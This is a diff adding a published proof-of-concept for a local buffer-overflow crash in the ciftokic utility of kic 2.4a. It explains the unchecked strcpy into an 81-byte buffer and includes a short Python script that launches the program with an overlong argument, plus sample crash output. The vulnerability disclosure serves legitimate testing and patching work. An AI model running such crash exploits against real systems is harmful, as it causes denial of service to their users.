@@ -1,0 +1,46 @@
+# Exploit Title: Ciftokic 2.4a - DoS Buffer Overflow
+# Date: September 30, 2019
+# Exploit Author: @JosueEncinar
+# Software Link: http://launchpad.net/ubuntu/+source/kic/2.4a-1
+# Version: 2.4a 
+# Tested on: Ubuntu 18.04
+
+'''
+If we check the ciftokic.c file on line 52 we see the following code: char CIFFile[81], *Tmp;.  
+In line 84 we have the problem with the following instruction: strcpy(CIFFile,argv[1]);
+
+If the first argument is 80 characters or less, nothing happens, but if we put from 81 onwards the program fails with a Buffer Overflow.
+'''
+
+# To test the code use Python 3.6+
+from os import system
+from sys import argv
+
+
+def print_usage():
+    print("Usage: python3 ciftokic_overflow.py <characters_numbers>")
+    print("      |_No Buffer Overflow: python3 ciftokic_overflow.py 80")
+    print("      |_Buffer Overflow: python3 ciftokic_overflow.py 81")
+
+if len(argv) == 1:
+    print_usage()
+else:
+    try:
+        number = int(argv[1])
+        payload = "J"*number
+        system(f"ciftokic {payload}")
+    except:
+        print_usage()
+
+
+"""
+
+Output Example:
+
+josue@josue:~/Escritorio$ python3 ciftokic_overflow.py 80
+Error: can't read CIF input file JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ
+josue@josue:~/Escritorio$ python3 ciftokic_overflow.py 81
+*** buffer overflow detected ***: ciftokic terminated
+Aborted (core dumped)
+
+"""
